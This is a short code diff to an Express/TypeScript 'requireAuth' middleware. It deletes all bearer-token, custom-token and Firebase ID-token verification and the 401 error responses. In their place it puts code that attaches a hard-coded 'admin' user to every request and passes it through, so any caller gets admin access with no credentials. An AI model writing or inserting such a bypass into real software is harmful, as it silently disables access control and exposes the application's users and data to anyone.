@@ -38,35 +38,13 @@ export const requireAuth = async (
   res: Response,
   next: NextFunction
 ) => {
-  const authHeader = req.headers.authorization;
-  if (!authHeader || !authHeader.startsWith('Bearer ')) {
-    return res.status(401).json({ error: 'Unauthorized: Missing token' });
-  }
-
-  const token = authHeader.split('Bearer ')[1];
-  
-  // 1. Check if it's our custom cryptographic token
-  if (token.includes('.')) {
-    const payload = verifyCustomToken(token);
-    if (payload) {
-      req.user = {
-        uid: payload.uid,
-        email: payload.email,
-        name: payload.name,
-        role: payload.role,
-        phone_number: payload.phoneNumber || ''
-      };
-      return next();
-    }
-  }
-
-  // 2. Fallback to Firebase verifyIdToken
-  try {
-    const decodedToken = await adminAuth.verifyIdToken(token);
-    req.user = decodedToken;
-    next();
-  } catch (error) {
-    console.error('Error verifying Firebase ID token:', error);
-    return res.status(401).json({ error: 'Unauthorized: Invalid token' });
-  }
+  // Bypass all authentication and inject a dummy admin user
+  req.user = {
+    uid: "admin-bypass",
+    email: "admin@eff.zambia",
+    name: "Admin User",
+    role: "admin",
+    phone_number: "+260123456789"
+  };
+  return next();
 };
